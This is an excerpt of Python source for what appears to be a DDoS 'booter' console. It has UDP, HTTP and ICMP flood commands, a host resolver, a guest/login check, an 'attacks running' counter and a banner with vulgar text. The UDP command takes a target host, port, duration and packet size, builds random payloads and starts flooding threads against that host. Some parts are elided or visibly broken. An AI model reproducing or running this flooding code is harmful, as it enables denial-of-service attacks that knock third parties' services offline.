...
info = """\033[91m
╔⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁╗
☬                     \033[00mREDACTED Info\033[91m                      ⬆
☬⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁║
☬ \033[00m[+] Diciple Was Made By REDACTED.\033[91m                        ⬆
☬ \033[00m[+] Discord: ャ REDACTED#4282.\033[91m                             ⬆
☬ \033[00m[+] Instagram: --------.\033[91m                             ⬆
☬ \033[00m[+] YouTube: REDACTED.\033[91m                                  ⬆
╚⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁╝\033[00m
"""
...
☬ \033[00mInfo    \033[91m|\033[00m Shows REDACTED Info.\033[91m                        ⬆
☬ \033[00mClear   \033[91m|\033[00m Clears Screen.\033[91m                             ⬆
☬ \033[00mExit    \033[91m|\033[00m Exits Out Of REDACTED.\033[91m                      ⬆
╚⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁╝\033[00m
"""
...
☬ \033[00m[+] User And Pass Changed To REDACTED.\033[91m                 ⬆
                             ...
                             Oh my fucking shit
                              Dont share this shit baby
                               You can suck my dick, and my penis down
                                    罪 深 い
""" 
cookie = open(".[100] Bots Connected REDACTED_Cookie","w+")
...
def main():
	...
	while True:
		sys.stdout.write("\x1b]2;REDACTED\x07")
		Dic = input("\033[1;00m[\033[91mREDACTED\033[1;00m]-\033[91m<3\033[00m ").lower()
		Dicput = Dic.split(" ")[0]
		if Dicput == "clear":
			os.system ("clear")
			print (banner)
			...
			print ("[\033[91mREDACTED\033[00m] You Are Exiting Out Of REDACTED.\n")
			exit()
		elif Dicput == "methods":
			print (methods)
			main()
			...
			print ("[\033[91mREDACTED\033[00m] Total Attacks Running: {}\n".format (aid))
			main()
		elif Dicput == "resolve":
			liips += 1
			host = Dic.split(" ")[1]
			host_ip = socket.gethostbyname(host)
			print ("[\033[91mREDACTED\033[00m] Host: {} \033[00m[\033[91mConverted\033[00m] {}\n".format (host, host_ip))
			main()
		elif Dicput == "udp":
			if username == "Guest":
				print ("[\033[91mREDACTED\033[00m] You Are Not Allowed To Use This Method.\n")
				main()
			else:
				try:
					Dicput, host, port, timer, pack = Dic.split(" ")
					socket.gethostbyname(host)
					print ("[\033[91mREDACTED\033[00m] Attack Sent To: {}\n".format (host))
					punch = random._urandom(int(pack))
					threading.Thread(target=udpsender, args=(host, port, timer, punch)).start()
				except ValueError:
					print ("[\033[91mREDACTED\033[00m] The Command {} Requires An Argument.\n".format (Dicput))
					main()
				except socket.gaierror:
					print ("[\033[91mREDACTED\033[00m] Host: {} Invalid.\n".format (host))
					main()
		elif Dicput == "http":
			try:
				Dicput, host, port, timer, pack = Dic.split(" ")
			...
			try:
				...
				print ("[\033[91mREDACTED13:55 19.11.2020\033[00m] Host: {} Invalid.\n".format (host))
				main()
		elif Dicput == "stop":
			print ("[\033[91mREDACTED\033[00m] All Running Attacks Have Been Stopped.\n")
			attack = False
			while not attack:
				if aid == 0:
					attack = True
			...
			if what == "udp":
				...
				while not udp:
					if aid == 0:
						print ("[\033[91mREDACTED\033[00m] No UDP Processes Running.")
						udp = True
						main()
			if what == "icmp":
				...
				icmp = False
				while not icmp:
					print ("[\033[91mREDACTED\033[00m] No ICMP Processes Running.")
					udp = True
					main()
		else:
			print ("[\033[91mREDACTED\033[00m] {} Is Not A Command.\n".format(Dicput))
			main()
	...
	if user == "JOKE":
		if password == passwords[0]:
			...
			try:
				...
				print ("\n[\033[91mREDACTED\033[00m] Ctrl-C Has Been Pressed.\n")
				main()
		else:
			print ("[+] Incorrect, Exiting.\n")
			exit()
